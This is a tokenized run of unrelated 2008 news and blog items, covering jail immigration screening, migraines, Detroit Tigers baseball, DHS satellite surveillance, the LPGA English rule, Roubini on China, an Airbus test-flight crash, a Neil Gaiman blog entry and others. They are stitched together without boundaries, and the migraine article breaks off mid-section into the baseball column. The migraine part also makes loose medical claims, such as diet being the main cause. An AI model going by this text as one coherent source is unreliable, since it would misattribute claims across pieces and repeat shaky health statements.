The Sheriff 's Office voluntarily started questioning inmates about their legal status and created the database in September 2006 , after a previously deported felon killed Houston police officer Rodney Johnson .
During the booking process , inmates are asked whether they are in the country illegally .
If they answer ' yes , ' their name and jail ID number is entered into a database that is shared with ICE agents in Houston .
The Chronicle compared the entries in the Sheriff 's Office database with immigration '' holds " placed by ICE with the Sheriff 's Office .
An immigration hold is essentially a request by ICE agents that law enforcement notify them before releasing an inmate .
ICE officials confirmed that jailers notify them before releasing immigrants who are marked for possible deportation .
The Houston Police Department , which runs the city 's jails , notifies ICE only about suspects with immigration warrants and previously deported felons .
Of the more than 80,000 bookings into Harris County Jail during the review period , about 3,500 — less than 5 percent — admitted to being in the country illegally .
ICE filed paperwork to detain roughly 900 of the 3,500 .
During the review period , the agency also filed paperwork to detain 2,500 suspects not included in the database , indicating that many immigrants who are eligible for deportation do not disclose that they are here illegally .
ICE , however , could not confirm whether the inmates marked for '' holds " actually were deported .
Landgrebe , the ICE official , also questioned the quality of the information in the Sheriff 's Office database , because it was based only on inmate responses and was entered by some jailers without immigration training .
More removals
ICE officials would not answer specific questions about ICE staffing at the Harris County or city jails but said screening has improved in recent months .
In October , the Sheriff 's Office started testing a Homeland Security database that gives jailers access to millions of immigration records .
The county 's participation in the federal government 's 287( g ) program , which trains jailers to act as immigration agents , also is expected to help improve screening , ICE officials said .
Harris County Sheriff - elect Adrian Garcia , who defeated incumbent Tommy Thomas in the November general election , said he plans to evaluate the office 's participation in the program after he takes office in January .
Thomas said he believes the program is necessary — at least until ICE has the resources to improve screening .
'' In a perfect world , I 'd like to see our borders secured to where we have someone we find to be here illegally , we turn them over to ICE and have them deported , " Thomas said .
'' But that 's not something that 's happening at this day and time . "

There are a number of reasons that may cause migraine headaches .
There are also a number of ways to prevent and cure migraine headache crisis .
What are migraine headaches ?
There are a few people who never experienced a headache .
For most people , the headache occurs occasionally and it can be cured relatively quickly with a painkiller or a little rest .
The migraine headaches , however , are much more than a headache .
This is the most common neurological disease that are suffering 10 - 15 % of the population and affects the quality of life .
In serious cases may even lead to abstention from the everyday activities for up to 3 days .
The main symptom of migraine headaches is the headache .
In the 2 / 3 of the cases the headache is detected in half of the head , usually behind one eye , while in the remaining 1 / 3 of the cases the pain lies across the head .
In terms of intensity the pain is very intense and overwhelming .
Most people suffering from migraine headaches have the feeling that a hammer is striking their heads from the inside in the same frequency as their pulse .
The migraine headaches , if left without treatment or if the action taken by the patient has proved ineffective , can take from 4 hours to 3 days .
Apart from the headache other symptoms associated with migraine crisis are nausea , vomiting and intolerance to light or different sounds .
Some people prior to the migraine headaches experience vision disorder e.g. they see bright lines , bright or dark regions in the visual field , etc .
The way in which migraine headaches crises occur differs from person to person so each patient describes their « own » version of a migraine headache .
The frequency of migraine headaches crisis also varies from patient to patient , from a very rare until very frequent .
Average , each patient presents crises every 2 - 3 months .
Some facts about migraine headaches
The pain is very intense and usually occurs in a hemisphere of the brain .
The major cause of migraine headaches is the diet ; other causes are stress , various nerve or endocrine disorders , allergies , the cold , an infection , high blood pressure , vision problems , poor posture .
Migraine headaches are sometimes accompanied by nausea , vomiting and intolerance to light ( common migraine ) .
The two - thirds of sufferers are women ( probably due to hormones ) .
It may affect all ages , but appears for the first time between childhood and adulthood , possibly in pregnancy , and rarely over 50 .
The women are most frequently affected by migraine headaches before menopause .
Types of Migraine headaches
Practically there are two types of migraine headaches : Headaches accompanied by warning signs ( aura ) and the one in which there is no aura .
The term aura meant a series of neurological symptoms , such as shimmer or vision , numbness on one side of the person or body , weakness , hallucinations , speech disorders , etc .
The migraine with aura is more rare than that without aura .
Phases of Migraine headaches
A typical migraine crisis usually develops in 3 phases , which are as follows :
1st stage :
The early symptoms
During this phase , which comes several hours or even 1 - 2 days prior to the migraine headache crisis , the person is either feeling very tired and yawns continuously or is very energetic and ends its activities in half the time than normally required .
Some patients feel an irresistible desire for some food , especially for sweets .
These are warning signs that many patients have noted and they are aware that after a few hours the headache migraine crisis will occur .
2nd stage :
The headache
If no proper treatment is given it can last from 4 hours to 3 days .
The headache is usually accompanied by anorexia , nausea and vomiting , and exacerbated by light , sounds , walking , cough , etc .
At this stage the patient prefers to remain lying in a quiet dark room and stopping any activity .
3rd stage :
After the crisis
After the migraine headache crisis the patient is feeling exhausted and drowsiness can be as high as lethargy .
This phase lasts from several hours to days .
Migraine Headaches cause # 1 : Food
Research about migraine headaches has found that the patient ’s diet is the major cause ( 20 - 40 % ) .
This is due to the foods the patient eats or because of eating habits .
In some cases , the headache can start as a result of allergic reactions to food ( food sensitivities ) .
The foods that may cause migraines in one person , does not necessarily mean that they would cause migraines in another .
The limits of intolerance differ from time to time , even in the same person .
Moreover , the sensitivity of everyone in food can vary by many factors , e.g. stress , sleep etc .
Since for everyone the « suspicious » food may be different , it should not be taken for granted that certain types of food cause migraine headaches .
How can we identify if food is a cause of migraine headaches ?
If you have noticed some sensitivity to certain types of food , start a diet that will not include those “ suspicious food ” .
If you get rid of the migraine headache add those foods back to your diet .
If migraines occur again , then you will be able to identify which foods cause you headaches and you should avoid these foods .
If this is the case , the dietician should give you alternative foods , nutritionally similar to those that you removed from your diet in order to ensure an adequate nutritional intake .
Food that can cause migraine headaches
The alcohol , particularly red wine , some meals containing nitric and nitrous esters or salts such as processed meats and sausages , can lead to migraine headache crisis .
The tyramine contained in old cheese is present in certain types of dishes such as Chinese , which can also be a factor for beginning a migraine crisis .
Migraine Headaches cause # 2 : Stress
Another popular cause of migraine headaches is the stress .
When the patient is under stress a series of changes are taking place in the body .
Among other things , during stress chemical compounds are affected in the brain and there is diversification of blood flow and oxygen .
The changes created by stress on the physiology of the body and especially the brain does not directly cause migraines , but this happens after a few days of such a situation .
It is for this reason that the headache migraine occurs after some difficult and stressful days .
Migraine Headaches cause # 3 : Change in weather conditions
Another factor that is a cause of a migraine headache is the weather .
According to data from recent surveys , more than 50 % of patients with headache migraine say that they are affected by certain weather conditions .
These patients indicate that periods of prolonged cold and dry weather are the most common factor that causes them a headache .
How can we prevent migraine headaches crisis
By the statistics , I have watched three of the five worst seasons in Detroit Tigers history , including the abysmal 2003 season when the team was saved from its 120th loss on the last day of the season .
Despite all of the changes in the team since 2003 , here we are again , in the same exact place that I remember for so many years .
Last Place .
Last .
The Cellar .
Are you kidding me ?
I was n’t as blindly optimistic about the Tigers as much of the country prior to the start of the season .
I had some nagging questions about the pitching staff — Is Kenny Rogers too old ?
( Yes ) ; Will Nate Robertson stay consistent ?
( No ) ; can Jeremy Bonderman emerge as a solid # 2 ? ( DL ) ; will Joel Zumaya and Fernando Rodney be able to return from injuries ?
( Yes !
And then struggle .
Damn . )
I guess I should have seen the warning signs when I started counting down the days until Francisco Cruceta would be granted a visa and ride in to save the bullpen after a 0 - 7 start .
Really ?
Who ?
Still , I figured that the Tigers could n’t possibly suffer from all of these separate struggles .
One misfortune is probable , two misfortunes — maybe , three and four could happen , but all of them and a 17 loss season from Justin Verlander and Curtis Granderson ’s broken hand to boot ?
I ’m not here to make excuses , but it felt that every possible thing that could have gone wrong during the season did , and it was painful to watch .
Still , relying on defensive optimism I thought this team would turn it around to make things interesting at the end of the season .
They even went on a brief mid-summer tear that seemed to indicate that things would get better , but whenever they needed a big hit , or big pitch or right managerial decision the wheels fell off .
Maybe this was just the universe re-aligning itself after everything went right in 2006 .
Hell , general manager / president Dave Dombrowski knew that this team was in trouble by the Draft in June , and definitely knew that 2009 was in jeopardy as well .
If drafting college relief pitchers does n’t scream , “ The bullpen is bare in 2009 ! ” then I do n’t know what does .
I will not question the aggressive trades in the offseason — they were good moves designed to put this team over the top .
Yet the warning signs were there the entire time , just hidden behind a $ 138 million curtain .
If there is one thing that the current financial crisis in this country has taught us , it is that there are such things as bad investments .
The Tigers did a poor job of playing the market and got stuck with a bunch of underperforming and non-performing assets .
All of their bright spots this season ( Granderson , Miguel Cabrera , Armando Galarraga , Magglio Ordonez ) were overshadowed by a bad portfolio and brought to the brink of collapse .
The questions are , what toxic investments can be shed , what new investments need to be made and are there enough positives buried in this mess to keep “ Leyland Brothers ” from collapsing long term ?
I think that there are , but it would really help if they could get in on this bailout .

NEWT EXPLAINS IT ALL FOR YOU ….
In the Wall Street Journal today , Newt Gingrich and Peter Ferrara tell us why median wages have sucked so badly during the Bush era :
Marginal tax rates for middle - income families in the 25 % tax bracket are too high .
Add in effective payroll tax rates of 15 % and state income taxes , and these workers are laboring under marginal tax rates of close to 50 % .
No wonder middle - income wage growth has slowed sharply .
Yep , that explains it : George Bush has kept taxes too damn high and no one wants to work anymore .
It ’s analysis like this that has made Newt the conservative visionary he is .

While America ’s attention has shifted to the economic meltdown and the presidential race between corporate favorites John McCain and Barack Obama , The Wall Street Journal reported Wednesday that the Department of Homeland Security ’s ( DHS ) National Applications Office ( NAO ) " will proceed with the first phase of a controversial satellite - surveillance program , even though an independent review found the department has n’t yet ensured the program will comply with privacy laws . "
When combined with illegal NSA and FBI domestic surveillance programs — from data - mining to the massive interception of telephone and internet communications — NAO will furnish DHS and outsourced corporate grifters who actually run the program , with the blanket coverage of American citizens long sought by securocrats .
As I wrote in June , NAO will coordinate how domestic law enforcement and " disaster relief " agencies such as FEMA use satellite imagery intelligence ( IMINT ) generated by U.S. spy satellites .
Based on available evidence , hard to come by since these programs are classified " above top secret , " the technological power of these military assets are truly terrifying .
Unlike commercial satellites that beam TV programs , forecast the weather or provide global positioning services , their military cousins are far more flexible , have greater resolution and therefore , more power to monitor human activity .
By utilizing different parts of the light - and infrared spectrum , spy satellites , in addition to taking ultra high - resolution photographs to within a meter of their " target , " can also track the heat signatures generated by people inside a building .
( " Homeland Security ’s Space - Based Spies , " Antifascist Calling , June 4 , 2008 )
In other words , when combined with illegal NSA and FBI domestic surveillance programs–from data - mining to the massive interception of telephone and internet communications –NAO will furnish DHS and outsourced corporate grifters who actually run the program , with the blanket coverage of American citizens long sought by securocrats .
Aside from The Wall Street Journal and The Raw Story , not a single media outlet has disclosed this vital information to the public .
Despite the absence of rigorous oversight that would determine whether or not NAO complies with what ’s left of privacy laws , DHS is proceeding full speed ahead .
The Journal reports ,
A new 60 - page Government Accountability Office report said the department " lacks assurance that NAO operations will comply with applicable laws and privacy and civil liberties standards , " according to a person familiar with the document .
The report , which is unclassified but considered sensitive , has n’t been publicly released , but was described and quoted by several people who have read it .
The report cites gaps in privacy safeguards .
The department , it found , lacks controls to prevent improper use of domestic - intelligence data by other agencies and provided insufficient assurance that requests for classified information will be fully reviewed to ensure it can be legally provided .
( Siobhan Gorman , " Satellite - Surveillance Program to Begin Despite Privacy Concerns , " The Wall Street Journal , October 1 , 2008 ) [ emphasis added ]
Reporting on the shocking absence of oversight features built into the program , Nick Juliano writes ,
Essentially , the bill only requires the Homeland Security Secretary to assure lawmakers that NAO programs comply with exisiting laws .
Congress also has required the DHS Inspector General to provide quarterly classified reports on how much information has been collected by the domestic satellite surveillance , although the bill required those reports be made to the House and Senate Appropriations Committees , not the Homeland Security Committees that are traditionally in charge of DHS oversight .
( " DHS satellite spy program going forward despite objections , " The Raw Story , October 2 , 2008 )
The GAO ’s suppressed report is not the first to criticize the breathtaking scope of this repressive program .
The Congressional Research Service ( CRS ) issued a study in June raising critical questions about NAO ’s legality .
Members of Congress and outside groups have raised concerns that using satellites for law enforcement purposes may infringe on the privacy and Fourth Amendment rights of U.S. persons .
Other commentators have questioned whether the proposed surveillance will violate the Posse Comitatus Act or other restrictions on military involvement in civilian law enforcement , or would otherwise exceed the statutory mandates of the agencies involved .
Such concerns led Congress to preclude any funds in the Consolidated Appropriations Act , 2008 ( H.R. 2764 , P.L. 110 -161 ) , from being used to " commence operations of the National Applications Office … until the Secretary [ of the Department of Homeland Security ] certifies that these programs comply with all existing laws , including all applicable privacy and civil liberties standards , and that certification is reviewed by the Government Accountability Office . "
( Section 525 . )
Similar language has been included in FY2009 homeland security appropriations bills .
( Richard A. Best Jr. and Jennifer K. Elsea , " Satellite Surveillance : Domestic Issues , " Congressional Research Service , June 27 , 2008 )
But as the Journal reported , Congress ’ " partial funding " for the program in " a little - debated $ 634 billion spending measure , " means that an operational NAO will now provide federal , state and local officials " with extensive access to spy - satellite imagery –but no eavesdropping –to assist with emergency response and other domestic - security needs , such as identifying where ports or border areas are vulnerable to terrorism . "
Such hollow " no eavesdropping " assurances to Congress from quarterly classified reports from the DHS Inspector General fly in the face of the steady erosion of constitutional protections by the Bush administration .
What " other agencies " might the GAO have in mind when citing concerns over potential abuse of intelligence data supplied by the National Applications Office ?
Well , take your pick since the U.S. " intelligence community " is comprised of 16 different agencies under the operational control of the Office of National Intelligence ( ODI ) and the powerful Office of the Director of National Intelligence ( ODNI ) .
Led by Michael McConnell , a ten - year veteran of the spooky Booz Allen Hamilton corporation , purchased this year by the sinister Carlyle Group , ODNI can truly be described as a " public - private partnership " in political repression .
As CorpWatch reported in March ,
McConnell … spent more than 10 years as a Booz Allen senior vice president in charge of the company ’s extensive contracts in military intelligence and information operations for the Pentagon .
In that job , his official biography states , McConnell provided intelligence support to " the U.S. Unified Combatant Commanders , the Director of National Intelligence Agencies , and the Military Service Intelligence Directors . "
That made him a close colleague of not only Donald Rumsfeld , who ran the Pentagon from 2001 to 2007 , but of Vice President Cheney , who has served President Bush as a kind of intelligence godfather since the earliest days of the administration .
( Tim Shorrock , " Carlyle Group May Buy Major CIA Contractor : Booz Allen Hamilton , " CorpWatch , March 8 , 2008 )
Investigative journalist Tim Shorrock revealed last year , that the intelligence - sharing system to be managed by NAO ,
… will rely heavily on private contractors including Boeing , BAE Systems , L - 3 Communications and Science Applications International Corporation ( SAIC ) .
These companies already provide technology and personnel to U.S. agencies involved in foreign intelligence , and the NAO greatly expands their markets .
Indeed , at an intelligence conference in San Antonio , Texas , last month , the titans of the industry were actively lobbying intelligence officials to buy products specifically designed for domestic surveillance .
( " Domestic Spying , Inc. " CorpWatch , November 27 , 2007 )
A d v e r t i s e m e n t
NAO will utilize the military imagery and mapping tools of the National Geospatial - Intelligence Agency ( NGA ) .
NGA maintains a symbiotic relationship with both the NSA and the ultra-secret National Reconnaissance Office ( NRO ) , that builds and maintains America ’s fleet of spy satellites .
Additionally , NRO operates the planetary wide network of ground stations where NSA ’s signals intelligence ( SIGINT ) and NGA ’s imagery intelligence ( IMINT ) are processed and analyzed .
Shorrock revealed that the program was kick - started in 2005 and the impetus came from veteran spooks with extensive ties to the military - industrial - security apparatus and corporate outfits such as Booz Allen Hamilton .
The company was " tasked " with studying how " intelligence from spy satellites and photoreconnaissance planes could be better used domestically to track potential threats to security within the U.S. "
Completed in 2005 , the Booz Allen plan became the basis for NAO .
Veteran spook Charles Allen told The Wall Street Journal in August 2007 that NAO is " an idea whose time has arrived . "
As DHS chief intelligence officer , Allen will head the new program .
Additionally , an " independent study group " appointed in 2005 by the Director of National Intelligence , tasked with reviewing the deployment of military reconnaissance assets in the " homeland " reached the desired conclusions .
According to a press release by the Department of Homeland Security ,
The study group unanimously recommended in its September 2005 report that the scope of the Civil Applications Committee be expanded beyond civil applications to include homeland security and law enforcement applications , and concluded that there is an urgent need for action .
The study group concluded a new approach is needed to effectively employ Intelligence Community capabilities for civil applications , homeland security and law enforcement uses .
( " Fact Sheet : National Applications Office , " Department of Homeland Security , August 15 , 2007 )
How " independent " ?
You make the call !
Shorrock reported that the group ,
… was chaired by Keith Hall , a Booz Allen vice president who manages his firm ’s extensive contracts with the NGA and previously served as the director of the NRO .
Other members of the group included seven other former intelligence officers working for Booz Allen , as well as retired Army Lieutenant General Patrick M. Hughes , the former director of the DIA and vice president of homeland security for L - 3 Communications , a key NSA contractor ; and Thomas W. Conroy , the vice president of national security programs for Northrop Grumman , which has extensive contracts with the NSA and the NGA and throughout the intelligence community .
( Shorrock , 2008 , op. cit. )
From the start , the group ’s findings were " heavily weighted " toward corporations " with a stake " in both foreign and domestic intelligence .
No surprise then , when the group ’s " contractor - advisers " called for " a major expansion in the domestic use of the spy satellites that they sell to the government . "
A power - grab by the ODNI and DHS should raise serious alarms of further encroachments by a lawless " unitary executive " and serve as a warning that domestic law enforcement is rapidly coming under the purview of opaque Pentagon spy agencies .
While the creeping militarization of civilian policing is not a new phenomenon , the NAO launch represents a qualitative leap towards the surveillance society dreamed up by Iran - Contra felon and former DARPA administrator John Poindexter , before he was kicked to the curb when plans for the Total Information Awareness ( TIA ) program first gained notoriety in 2003 .
And like the newly - launched NAO , TIA was managed by none other than Booz Allen Hamilton and their sidekicks at the San Diego - based Science Applications International Corporation !
Small world ( of open - ended contracts for giant Bush regime - connected multinationals ) .
The NAO will be overseen by the National Applications Executive Council ( NAEC ) .
In turn , NAEC will be " tri-chaired " by the Deputy Secretary of Homeland Security , the Deputy Secretary of the Department of the Interior ( DOI ) , and the Principal Deputy of the Director of National Intelligence , a position held by Donald M. Kerr .
As with the vast majority of top securocrats , Kerr has served in a multitude of capacities inside and outside government .
When he ended his tenure as Director of the National Reconnaissance Office in 2007 , Kerr joined ONI .
The one - time CIA and FBI employee was also a SAIC executive vice president during the 1990s .
Tim Shorrock reported in his essential book , Spies for Hire , that Kerr described how " ninety - five percent of the resources over which we have stewardship in fact go out on a contract to our industrial base .
It ’s an important thing to recognize that we cannot function without this highly integrated industrial government team . "
Brutal honesty for brutal times .
Despite rigorous objections by members of Congress and civil liberties ’ groups to a program with the breathtaking potential to invade our privacy in newer and more lethal ways , NAO is now reality .
America ’s headlong flight towards constructing a post-Constitutional " new order " just added another brick in the wall .

Call of Duty : Vegetation compared ( picture : PCGH , Jay .

The original and thus first part of Call of Duty was released in late 2003 and utilized an engine that once was the basis for an id Software shooter in 1999 .
But back then heavily modified code enabled up - to - date graphics in extensive outdoor levels and some pixel shading for improving water surfaces .
Call of Duty 2 hit the market about two years later .
The distinctive features this time : Call of Duty 2 takes place in World War II and utilizes a self developed engine that massively used DX9 features to create the possibly most realistic visualization back in 2005 .
Even with today 's standards the game is still looking very good .
Part 3 had been for the consoles exclusively and thus the transfer to modern battlefields came to the PC in November 2007 .
Call of Duty : Modern Warfare offered high - tech weapons , night vision sight and helicopters :
The rest was , despite the graphics , still the same : Shooting and bombing with a squad .
Visually the title is up - to - date , but can't outrun its predecessors in certain situations .
Here the rule of marginal profit comes into effect : Every little bit of visual improvement costs a lot of performance .
The development of the CoD series is continued with Call of Duty 5 World at War , but the origin is still obvious .
New effects deliver very good graphics and the visualization of the ocean or the flames are really impressive .
So that you can get an impression of the evolution , we put some significant screenshots into the picture gallery .
We compare vegetation , fire and explosions , weapon models and NPCs .
Have fun .

Under increasing criticism , the LPGA Tour on Friday backed off plans to suspend players who could not efficiently speak English at tournaments .
LPGA
Tour commissioner Carolyn Bivens said she would have a revised plan by the end of the year that would not include suspensions for players unable to speak English in pro-ams , trophy presentations or interviews .
Fining such players remained an option .
Bivens disclosed the tour 's original plan in a meeting with South Korean players two weeks ago at the Safeway Classic in Portland , Ore. , Golfweek magazine reported .
The policy , which had not been written , was widely criticized as discriminatory , particularly against Asian players .
The LPGA membership includes 121 international players from 26 countries , including 45 from South Korea .
Asians won three of the four majors this year .
" We have decided to rescind those penalty provisions , " Bivens said in a statement .
" After hearing the concerns , we believe there are other ways to achieve our shared objective of supporting and enhancing the business opportunities for every tour player . "
The reversal was quickly hailed by two California lawmakers who challenged the original policy .
State Sen. Leland Yee , a Democrat from San Francisco , had asked the Legislature 's legal office to determine whether the English policy violated state or federal anti-discrimination laws .
If it was deemed legal , Yee said he would have pushed for legislation banning such policies in California .
The LPGA Tour plays three events in California , including its first major championship .
" I 'm very pleased that the LPGA saw the wisdom of the concerns that we raised , " Yee said .
" It 's a no - brainer for those of us who have been the recipient of these kinds of discriminatory acts . "
State Assemblyman Ted Lieu , a Democrat from the Los Angeles area , said he would target corporate sponsors if the LPGA persisted with its English requirement .
" I 'm pleased they have come to their senses , " he said .
Bivens ' announcement came two hours before the Asian Pacific American Legal Center planned a news conference in Los Angeles to demand the LPGA overturn its policy .
" Until they completely retract it , issue an apology to the players and the fans , I think we 'll remain very concerned and interested in what happens , " said Gerlad D. Kim , a senior staff attorney for the center .
" The LPGA has gone about this totally the wrong way . "
One of the tour 's title sponsors , State Farm , already weighed in this week by saying it was " dumbfounded . "
" We do n't understand this and we do n't know why they have done it , " State Farm spokesman Kip Diggs told Advertising Age on its website .
" And we have strongly encouraged them to take another look at this . "
Bivens said the tour will continue to help international players through a cultural program that has been in place for three years and offers tutors and translators .
Earlier this week , Bivens sent a 1,200 - word memo to the LPGA membership to outline the goal behind the new policy .
She said players would never be required to be fluent or even proficient in English , rather get by on fundamental aspects that would enhance the tour and the players .
She argued that international players who could communicate effectively in English would improve the pro-am experience , sponsor relations and could held land endorsements for the players .
" We do not , nor will we ever , demand English fluency , or even proficiency , from our international players , " she wrote .
" To the contrary , we are asking that they demonstrate a basic level of communication in English at tournaments in the United States in situations that are essential to their job as a member of the LPGA Tour . "
Yee said he understood the tour 's goal of boosting financial support , but disagreed with the method .
" In 2008 , I did n't think an international group like the LPGA would come up with a policy like that , " Yee said .
" But at the end of the rainbow , the LPGA did understand the harm that they did . "
The lawmaker said he will continue with his request to the Legislative Counsel 's Office , as a way to prevent similar policies in the future .
Lieu said the LPGA 's explanation made it seems as though the tour felt it more important to socialize with sponsors than to play golf .
" If you 're a sports fan , you should be outraged , " Lieu said .

Nouriel Roubini has been quiet for a few days , but you did n't think he was getting bullish , did you ?
Of course not .
In fact , now that a global systemic financial crisis appears to have been narrowly averted , he has turned his attention to the next land mine : China .
China , says Nouriel , is at risk of a hard landing ( which , for China , would mean a slowdown of growth to 5 % - 6 % ) .
The cause ?
The US consumer , of course .
That recent uplift in global stock prices ?
A " sucker 's rally . "
The recent economic news in the US ?
" Worse than awful . "
Read on ...
For the last few years the global economy has been running on two engines , the U.S. on the consumption side and China on the production side , both lifting the entire global economy .
The U.S. has been the consumer of first and last resort spending more than its income and running large current account deficits while China ( and other emerging market economies ) has been the producer of first and last resort , spending less than its income and running ever larger current account surpluses .
For the last few months the first engine of global growth has effectively shut down as the latest batch of macro news from the U.S. are worse than awful : collapsing consumption and consumer confidence , plunging housing , collapsing auto sales , plunging durable goods spending ( while also supply side indicators such as production , ISM and employment are also free falling ) .
The U.S. is entering its worst consumer recession in decades both supply and demand data look worse than in the severe recessions of 1974 - 75 and 1980 - 82 .
And in due time this tsunami of awful macro news , together with ugly downside surprises to earnings will take another toll on equity valuations that are now temporarily lifted by another bear market sucker ’s rally .
More worrisome there are now increasing signs that the other main engine of the global economy – China - is also stalling .
Let us consider now in detail the evidence that China may be on its way to a hard landing …
The latest batch of macro data from China are mixed but all pointing towards a sharp deceleration of economic growth : official GDP data showing growth down to 9 % from the 12 % of a couple of years ago ; sharply falling spending on consumer durables ( autos ) ; falling home sales and sharp fall in construction activity ; leading indicators of the manufacturing sector ( the Chinese PMI ) showing a value of 44.6 % ( i.e. an outright contraction of manufacturing as a level below 50 % indicates a contraction ) , its lowest level ever since its publication .
9 out of 11 PMI sub indices showed contraction - Output , New Orders , Input Prices , Purchases of Inputs , New Export Orders , Imports , Backlogs of Orders , Stocks of Major Inputs .
Output index fell to 44.3 from 54.6 in September , while new orders dropped to 41.7 from 51.3 , while the inventory index climbed to 51.4 from 50.5 .
The decline in total orders has been even stronger than in export orders , thus suggesting a weakening in both domestic and export demand .
And the decline in construction activity is without doubt a major contributor to the recent weakness in industrial activity in China .

According to a article just out from Huffington Post , the story about flags from the Democratic National Convention being thrown away is simply false .
The story was jumped on and apparently authored by the McCain campaign .
But the real tell is down in the Huffpo piece where it traces the story to none other than Fox News ’ Carl Cameron .
Longtime readers of TPM will remember that back in October 2004 this site caught Cameron publishing a series of fabricated quotes attributed to John Kerry on the front page of the Fox News website .
After I placed a series of calls to Fox News inquiring about the Kerry story , the story was eventually pulled , and Fox was forced to issue an apology and retract the fabricated story .
Fox spokesman Paul Schur told TPM : “ Carl [ Cameron ] made a stupid mistake which he regrets .
And he has been reprimanded for his lapse in judgment .
It was a poor attempt at humor . ”
Why anybody would believe anything this joker says is difficult to fathom .
But he ’s good enough for McCain .
Shirwa Ahmed , a Somali man who lived in the Twin Cities , apparently blew himself up last week in northern Somalia — and there are almost a dozen others who recently disappeared from the Minneapolis area .
5 EYEWITNESS NEWS has learned that federal law enforcement sources believe that a Twin Cities man blew himself up in a suicide bombing in Northern Somalia last month .
The FBI and Homeland Security are investigating whether Shirwa Ahmed had developed a terrorist recruiting network in the area .
5 EYEWITNESS NEWS learned that Ahmed came to the Twin Cities in 1996 and graduated from Roosevelt High School in Minneapolis .
He was a naturalized U.S. citizen .
More than a dozen young men of Somali descent , mostly in their 20s , from the Minneapolis area have recently disappeared , U.S. law enforcement officials tell 5 EYEWITNESS NEWS .
All are thought to be associates of Ahmed .
U.S. officials suspect most of the young men have departed for Somalia to fight in ongoing violence there or to train in terrorist camps .
Family members of the young men are said to be distraught , trying to figure to out what happened to them , sources say .
So far , the investigation has not uncovered credible evidence of a plot targeting the U.S. but American officials want to track down all these young men before they can say for certain what this is or is not , according to ABC News .

Crews are looking for any survivors in the Mediterranean off France
Two people have been killed and five others are missing after an Airbus A320 jet crashed during a test flight after maintenance work , officials have said .
The plane went into the Mediterranean Sea off the coast of France near Perpignan with two Germans and five New Zealanders on board .
Two bodies have been recovered and search crews are looking for the jet 's data recorders and the missing people .
The plane was leased by Germany 's XL Airways from Air New Zealand .
Air New Zealand chief executive Rob Fyfe said the cause of the crash was not yet known .
France 's civil aviation authority said the plane went down as it approached Perpignan airport after an hour - long test flight .
The wreckage of the plane was reported to be in several pieces , but a rescue official said the fuselage had been found .
Several ships as well as helicopters and a plane were searching for survivors while navy divers were looking for the plane 's " black - box " data recorders .
Airbus said the plane had been built in 2005 and had accumulated about 7,000 hours of flying time since then .
Air New Zealand leased the plane to XL Airways in 2006 and it was undergoing checks after a refit before being handed back to Air New Zealand , Mr Fyfe said .
On board were two German pilots , four Air New Zealand engineers and an inspector from the New Zealand Civil Aviation Authority , said a spokesman for XL Airways .
The A320 is a single - aisle jet that can seat about 150 passengers and is one of the most popular Airbus jets in use .

I opened the Google window and found myself looking at an advert for a G1 phone .
A couple of clicks later I was on the T - mobile website , checking prices and thinking , " Well , I do need a new phone ...
" But randomly buying a phone I have n't even held seemed like , well , something that I could n't imagine myself doing .
I wanted to hold it .
I wanted to know the specs and such , so I put dog in the back of the car and drove to the local T - Mobile shop .
I knew I was in the right place because there were huge posters everywhere , some bigger than I was , all advertising the new t- Mobile G1 .
" Hello , " I said , like a man entering a cheeseshop .
" I 'd like to play with a G1 , please .
" There was a man and a woman behind the counter .
They said they were sorry but they did n't have a G1 for me to play with .
" When will you get them in ?
" " We wo n't get them in . " " No ? " " No . " " Look , are we talking about the same thing ?
G1 phone .
The one on that poster .
And that poster .
And that one ... "
The posters were staring at me from the counter .
They were all around me .
" No .
We wo n't sell it .
We 're out of the range and the Google and things that the phone comes with , they wo n't work on it .
" I pulled out my phone , a Nokia N 73 , with a T - Mobile SIM card , that happily spends much too much time on the internet doing , er , Google and things .
" But this works here ... " " The G1 wo n't work .
It wo n't do the Google here .
So we are n't allowed to sell it . " " But .... "
I tried to think with this .
then I said , " But you have posters . " I gestured at them .
All pictures of the phone in question , extolling its virtues and explaining that you could only get it here .
"
We 're a T - Mobile franchise .
They send them to us .
That 's what we have to put up .
The posters they send . " " Well , can we talk about the G1 specs ? " " We do n't know them . "
The man and the woman behind the counter seemed very sad about this .
The man added , wistfully , " We do n't even know the price .
" I knew the price , from the website earlier , and I felt guilty about this .
" They have them in the Twin Cities , " said the woman .
" You could buy one there . " " But if I buy it there , it still wo n't work here ? " " No , " she said , with sadness and with , I suspect envy in her voice .

I think I may have said , " Sorry about the posters , " as I went out , or I may have just thought it very loudly .
They all had pretty pictures of the G1 on them , a phone I do n't think I 'm going to bother getting .... I did n't , but I do now .
Thanks to everyone who let me know .
Actually , my first reaction was " But that was last year , " and then I realised that , no , it 's this year too .
And when I checked the winners list ( at http://blog.izea.com/2008/10/announcing-the-2008-bloggers-choice-awards-winners-1.html ) , I had also won something called the Blogitzer for the blogger who demonstrates the best writing ability on his or her blog .
( I can see my Blogger 's Choice Award from last year , on top of this desk .
It 's pretty and glass , about ten inches tall , and it's a very cheerful sort of award , which I know because it has n't gone to live in a serious awards cabinet . )
If nobody minds , having won it twice , I 'll now withdraw this blog from the Hottest Daddy Blogger category in future years , and let some other , er , Hot Daddies , have their day in the sun .... The Graveyard Book was reviewed in The Independent , an odd sort of descriptive review of the kind that leaves you , at the end , going yes , but did you like it ?
Was it any good ?
( Then again , a Google showed that the same reviewer in the same paper really , really disliked Coraline about six years ago , and has either mellowed , enjoyed the Graveyard Book more , or , on the evidence of the last paragraph , just decided not to buck the tide .
Hard to tell .
Still , I get compared to Leon Garfield , and that alone is cause for celebration . ) ...

On Sunday , while attempting to get the sweet love of a woman he met through a Craigslist sex ad , a 37 - year - old Concord man found himself dodging bullets instead .
Rendezvousing at the 4700 block of Matheson Court , the victim says that he had " responded to a Craigslist ad posted by a woman named ' Angel ' and arranged for her to come to his house . "
However , once inside the house , " Angel " devilishly stole his wallet and then ran out the door .
When the man chased after the thief and grabbed her , the women then screamed for help , prompting a man with a pistol to come to her aid .
The victim saw the gun , ran back inside , and closed the door .
The man outside then fired a few rounds through the door .
The victim was shaken and scraped , but otherwise uninjured .
" Angel " is described " as a black woman about 22 years old with brown hair , brown eyes and a light complexion ... about 5 feet 1 inch tall and weighing about 135 pounds . "
The femme fatale was last seen sporting " a black tank top with white sequins and blue jeans . "
She and her colleague remain at large .
Be careful out there on the internet , people .

Attached is a rarely seen perspective : a video of a U.S. Navy SEAL extraction was filmed from inside an MH - 47 Chinook helicopter .
